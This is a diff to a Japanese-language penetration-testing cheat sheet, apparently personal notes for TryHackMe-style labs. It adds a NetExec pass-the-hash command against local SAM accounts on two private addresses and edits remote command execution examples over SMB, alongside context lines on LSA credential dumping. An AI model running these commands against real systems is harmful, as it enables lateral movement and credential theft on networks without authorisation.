@@ -66,6 +66,12 @@ nxc rdp $TARGET -u 'user' -p 'pass'
 nxc smb $TARGET -u 'user' -p 'pass'
 ```
 
+### ローカルSAMに対して認証
+
+```sh
+nxc smb 192.168.13.61 192.168.13.51 -u Administrator -H <hash> --local-auth
+```
+
 ### 認証情報ダンプ
 
 ※成功したのは見たことが無い
@@ -77,8 +83,8 @@ nxc smb $TARGET -u 'Administrator' -p 'pass' --lsa
 
 ### コマンド実行
 
-※成功したのは見たことが無い
-
 ```sh
-nxc smb $TARGET -u 'admin' -p 'pass' -x 'whoami /all'
+nxc smb $TARGET -u 'admin' -p 'pass' -d thm.loc -x 'whoami /all'
+
+nxc smb $TARGET -u 'admin' -p 'pass' -d thm.loc -x '$PSVersionTable'
 ```
